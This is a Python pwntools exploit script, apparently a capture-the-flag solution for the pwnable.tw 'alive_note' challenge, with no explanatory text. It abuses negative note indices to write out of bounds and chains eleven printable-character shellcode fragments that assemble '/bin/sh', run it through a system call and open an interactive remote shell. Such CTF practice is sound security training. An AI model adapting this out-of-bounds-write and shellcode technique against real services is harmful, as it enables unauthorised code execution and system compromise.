from pwn import *

#p = process('./alive_note')
p = remote('chall.pwnable.tw',10300)
context.log_level = "debug"

def add_note(index,name):
        p.sendlineafter(':',str(1))
        p.sendlineafter(':',str(index))
        p.sendafter(':',name)
def show_note(index):
        p.sendlineafter(':',str(2))
        p.sendlineafter(':',str(index))
def delete_note(index):
        p.sendlineafter(':',str(3))
        p.sendlineafter(':',str(index))
def exit():
        p.sendlineafter(':',str(4))

def add_and_padding(index,name):
        add_note(index,name+'u8') # "u8" is opcode of: jne 0x38
        add_note(-1,'a'*8)
        add_note(-1,'a'*8)
        add_note(-1,'a'*8)

gdb.attach(p,"""b* 0x80488ea""")
pause()

shellcode1 = asm("""
        xor ax, 0x3030
        dec edx
        dec edx
""")
add_and_padding(-27,shellcode1)

shellcode2 = asm("""
        xor ax, 0x3231
        dec edx
        dec edx
""")
add_and_padding(0,shellcode2)

shellcode3 = asm("""
        dec edx
        dec edx
        xor [eax+0x45], dl
        dec edi
""")
add_and_padding(1,shellcode3)

shellcode4 = asm("""
        xor [eax+0x46], dl
        dec edi
        dec edi
        dec edi
""")
add_and_padding(2,shellcode4)

shellcode5 = asm("""
        push 0x68734141
        pop eax
""")
add_and_padding(3,shellcode5)

shellcode6 = asm("""
        xor ax, 0x6e6e
        push ecx
        dec esi
""")
add_and_padding(4,shellcode6)

shellcode7 = asm("""
        push 0x6e696230
        pop ecx
""")
add_and_padding(5,shellcode7)

shellcode8 = asm("""
        dec ecx
        push ebx
        push eax
        push ecx
        push esp
        pop eax
""")
add_and_padding(6,shellcode8)

shellcode9 = asm("""
        push ebx
        push ebx
        push ebx
        push eax
        push ebx
        push ebx
""")
add_and_padding(7,shellcode9)

shellcode10 = asm("""
        push ebx
        push ebx
        popad
        push eax
        push ebx
        push esp
""")
add_and_padding(8,shellcode10)


shellcode11 = asm("""
        pop ecx
        push 0x41
        pop eax
        xor al, 0x4a
""")
add_note(9,shellcode11+'\x37\x7a')

delete_note(0)
p.interactive()
